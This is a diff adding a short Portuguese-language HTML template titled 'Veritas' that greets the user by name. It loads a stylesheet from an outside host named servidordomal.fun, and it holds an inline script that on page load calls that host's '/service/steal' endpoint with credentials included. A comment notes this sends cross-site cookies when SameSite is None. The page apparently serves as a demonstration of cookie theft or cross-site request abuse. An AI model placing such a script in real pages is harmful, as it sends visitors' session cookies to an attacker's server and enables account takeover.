@@ -1,0 +1,21 @@
+<!doctype html>
+<html lang="pt-br">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Veritas</title>
+        <link
+            rel="stylesheet"
+            href="https://servidordomal.fun/style/style.css"
+        />
+    </head>
+    <body>
+        <h1>Welcome! {{.Name}}</h1>
+        <script>
+            fetch("https://servidordomal.fun/service/steal", {
+                method: "GET",
+                credentials: "include", // Isso manda cookies cross-site se SameSite=None
+            });
+        </script>
+    </body>
+</html>
